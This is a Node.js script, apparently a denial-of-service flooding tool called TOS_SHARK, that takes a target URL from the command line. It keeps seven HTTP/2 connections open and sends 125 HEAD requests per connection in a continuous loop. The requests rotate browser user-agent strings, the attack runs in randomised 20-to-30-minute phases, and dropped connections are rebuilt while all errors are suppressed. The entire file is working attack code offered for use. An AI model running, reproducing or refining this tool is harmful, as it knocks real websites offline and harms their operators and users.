const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = 'H2-MULTIPLEX';
        
        // Attack methods pool - ONLY H2-MULTIPLEX
        this.methods = ['H2-MULTIPLEX'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        
        // 7 HTTP/2 connections pool
        this.connections = [];
        this.maxConnections = 7;
        
        this.startCycle();
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ];
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        // Step 1: Create 7 HTTP/2 connections
        this.createConnections();
        
        // Step 2: Main attack loop
        this.attackLoop();
    }

    createConnections() {
        for (let i = 0; i < this.maxConnections; i++) {
            try {
                const client = http2.connect(this.target);
                this.connections.push(client);
                
                // Handle connection errors
                client.on('error', () => {
                    // Try to recreate connection
                    setTimeout(() => {
                        const idx = this.connections.indexOf(client);
                        if (idx !== -1) {
                            try { client.destroy(); } catch(e) {}
                            try {
                                const newClient = http2.connect(this.target);
                                this.connections[idx] = newClient;
                            } catch(e) {}
                        }
                    }, 1000);
                });
            } catch (err) {
                // Connection failed, will retry later
            }
        }
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                // Attack phase (20-30 minutes)
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Execute H2-MULTIPLEX with 7 connections
                await this.attackH2Multiplex();
                
            } else {
                // Break phase (20-30 minutes)
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                // Maintenance during break
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        
        // Clean up connections during break
        this.cleanupConnections();
    }

    // ===== ATTACK METHOD =====
    async attackH2Multiplex() {
        // Use all 7 connections
        for (const client of this.connections) {
            if (client && !client.destroyed && client.socket && !client.socket.destroyed) {
                // Send 125 HEAD requests per connection
                for (let i = 0; i < 125; i++) {
                    this.sendH2HeadRequest(client);
                    this.totalReqs++;
                    this.reqCounter++;
                }
            }
        }
    }

    sendH2HeadRequest(client) {
        try {
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.host,
                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        // Force garbage collection
        if (global.gc) global.gc();
        
        // Rotate user agents
        this.userAgents = this.generateUserAgents();
        
        // Recreate connections
        this.cleanupConnections();
        this.createConnections();
    }

    cleanupConnections() {
        for (const client of this.connections) {
            try {
                if (client && !client.destroyed) {
                    client.destroy();
                }
            } catch (e) {
                // Ignore
            }
        }
        this.connections = [];
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }

    // ===== UTILS =====
    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
